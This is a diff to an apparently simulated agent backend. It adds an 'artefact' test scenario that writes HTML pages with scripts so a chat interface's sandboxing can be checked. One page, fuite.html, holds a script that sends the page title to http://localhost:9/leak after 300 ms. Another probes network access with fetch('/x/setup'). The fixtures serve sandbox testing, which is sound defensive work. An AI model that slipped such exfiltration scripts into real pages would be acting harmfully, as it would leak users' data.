@@ -29,6 +29,9 @@
  * Profiles: see profiles.ts; kanban: see kanban.ts (workers, dispatch, terminate).
  * - "delegue": two sub-agents (subagent.start / subagent.complete), the second a child of the first; the
  *   delegate_task call and its result (`{results: [...]}`) are stored in the messages like Hermes does
+ * - "artefact": writes rapport.html in the session folder (like "fichier") with a script that writes in the page and
+ *   tries fetch('/x/setup'), then answers with a `::artefact <path>` line; "absent" too: a line for a missing page;
+ *   "fuite": fuite.html instead, whose script navigates its frame to http://localhost:9/leak?d=… after 300 ms
  * - "taches": two todo_list calls (the second with merge: true, 1.5 s later), each result = the full list
  *
  * - "fichier" (in the input): writes rapport.md in the session folder named by the framing block,
@@ -305,6 +308,7 @@ class Simulator {
     if (/fichier/i.test(run.input)) return this.playFile(run, step);
     if (/delegue/i.test(run.input)) return this.playDelegate(run, step);
     if (/t[aâ]ches/i.test(run.input)) return this.playTodos(run, step);
+    if (/artefact/i.test(run.input)) return this.playArtifact(run, step);
     await sleep(step);
     this.push(run, { event: 'message.delta', delta: 'Je regarde ' });
     await sleep(step);
@@ -366,6 +370,40 @@ class Simulator {
     this.push(run, { event: 'tool.completed', tool: 'delegate_task', duration: 4.2, error: false, preview: result.slice(0, 500), call_id: 'call_d1' });
     await sleep(step);
     this.finish(run, 'Les deux sous-agents ont fini : 1 240 € de ventes à Frouard.');
+  }
+
+  /** "artefact" scenario: an HTML page with a script, shown in the thread by its `::artefact` line. */
+  private async playArtifact(run: SimRun, step: number) {
+    const dir = /dans (\S+\/sessions\/[^/\s]+)\/\./.exec(run.instructions)?.[1] ?? '/workspace/sessions/inconnue';
+    const leak = /fuite/i.test(run.input);
+    const path = `${dir}/${leak ? 'fuite' : 'rapport'}.html`;
+    if (path.startsWith(`${this.filesRoot}/`) && leak) {
+      mkdirSync(dir, { recursive: true });
+      writeFileSync(path, `<!doctype html><html lang="fr"><head><meta charset="utf-8"><title>Fuite</title></head>
+<body><p id="state">avant</p><script>
+setTimeout(() => { location.href = 'http://localhost:9/leak?d=' + encodeURIComponent(document.title); }, 300);
+</script></body></html>
+`);
+    } else if (path.startsWith(`${this.filesRoot}/`)) {
+      mkdirSync(dir, { recursive: true });
+      writeFileSync(path, `<!doctype html><html lang="fr"><head><meta charset="utf-8"><title>Rapport</title>
+<style>body{font:15px system-ui,sans-serif;margin:1.5rem;color:#222}b{color:#c50}</style></head>
+<body><h1>Ventes</h1><p id="js">sans script</p><p id="net">réseau : ?</p>
+<script>
+document.getElementById('js').textContent = 'Script exécuté : ' + (1240 + 980) + ' €';
+fetch('/x/setup').then(() => { document.getElementById('net').textContent = 'réseau : ouvert'; },
+  () => { document.getElementById('net').textContent = 'réseau : bloqué'; });
+</script></body></html>
+`);
+    }
+    await sleep(step);
+    this.push(run, { event: 'tool.started', tool: 'write_file', preview: path, call_id: 'call_1' });
+    await sleep(step);
+    this.push(run, { event: 'tool.completed', tool: 'write_file', duration: 0.05, error: false, preview: path, call_id: 'call_1' });
+    this.addMessage(run.sessionId, 'tool', `Wrote ${path}`, { tool_name: 'write_file' });
+    await sleep(step);
+    const missing = /absent/i.test(run.input) ? `\n\nEt l'ancienne version :\n::artefact ${dir}/ancien.html` : '';
+    this.finish(run, `Voici la page des ventes :\n::artefact ${path}\nElle additionne les deux magasins.${missing}`);
   }
 
   /** "taches" scenario: the agent writes its task list, then updates it (merge) 1.5 s later. */
